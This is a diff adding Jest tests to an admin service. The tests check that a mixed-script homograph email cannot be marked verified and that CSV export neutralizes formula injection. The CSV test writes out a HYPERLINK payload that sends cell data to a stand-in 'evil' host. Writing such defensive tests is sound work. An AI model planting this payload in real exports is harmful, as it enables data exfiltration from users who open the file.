@@ -176,6 +176,62 @@ describe('AdminService', () => {
     });
   });
 
+  describe('verifyUser (mixed-script email gate)', () => {
+    it('rejects verification when the email local part mixes scripts', async () => {
+      // Pass-9 blocks mixed-script emails at registration via the
+      // User model's beforeValidate hook, but user.update({
+      // emailVerified: true }) doesn't trigger that hook. Without
+      // an explicit gate here, an admin could mark a homograph
+      // email as verified anyway. The verifyUser path re-checks
+      // the local part and refuses.
+      //
+      // To stage a mixed-script email past registration (so we
+      // can test the admin path itself), bypass the hook with
+      // { hooks: false } — this is the same way a row could end
+      // up in production if it predates the gate or comes in via
+      // a future migration/import.
+      const mixedScriptEmail = 'аdmin@example.com'; // leading 'а' is Cyrillic U+0430
+      const user = await User.create(
+        {
+          userId: 'user-mixed-1',
+          firstName: 'Mixed',
+          lastName: 'Script',
+          email: mixedScriptEmail,
+          password: 'hashedPassword123!',
+          status: UserStatus.ACTIVE,
+          userType: UserType.ADOPTER,
+          emailVerified: false,
+        },
+        { hooks: false }
+      );
+
+      await expect(AdminService.verifyUser(user.userId, 'admin-1')).rejects.toThrow(
+        /mixed-script email/
+      );
+
+      const after = await User.findByPk(user.userId);
+      expect(after?.emailVerified).toBe(false);
+    });
+
+    it('verifies a user whose email local part is single-script', async () => {
+      const user = await User.create({
+        userId: 'user-clean-1',
+        firstName: 'Clean',
+        lastName: 'Email',
+        email: 'clean@example.com',
+        password: 'hashedPassword123!',
+        status: UserStatus.ACTIVE,
+        userType: UserType.ADOPTER,
+        emailVerified: false,
+      });
+
+      await AdminService.verifyUser(user.userId, 'admin-1');
+
+      const after = await User.findByPk(user.userId);
+      expect(after?.emailVerified).toBe(true);
+    });
+  });
+
   describe('Error Handling', () => {
     it('should handle errors in getUsers gracefully', async () => {
       await expect(AdminService.getUsers({ page: -1, limit: 0 })).resolves.toBeDefined();
@@ -184,6 +240,29 @@ describe('AdminService', () => {
     it('should handle errors in platform metrics gracefully', async () => {
       const result = await AdminService.getPlatformMetrics();
       expect(result).toBeDefined();
+    });
+  });
+
+  describe('CSV export formula injection', () => {
+    it('neutralizes leading formula triggers in user-controlled fields', async () => {
+      await User.create({
+        userId: 'user-csv',
+        firstName: '=HYPERLINK("http://evil/?p="&A1,"click")',
+        lastName: 'Doe',
+        email: 'csv-injection@example.com',
+        password: 'hashedPassword123!',
+        status: UserStatus.ACTIVE,
+        userType: UserType.ADOPTER,
+        emailVerified: true,
+      });
+
+      const csv = await AdminService.exportData('users', 'csv');
+
+      // The formula trigger must be neutralized with a leading single quote
+      // BEFORE the RFC-4180 quote wrapping (commas in HYPERLINK trigger wrapping).
+      expect(csv).toContain('"\'=HYPERLINK');
+      // Sanity: an un-neutralized payload would appear without the leading '.
+      expect(csv).not.toContain('"=HYPERLINK');
     });
   });
 });
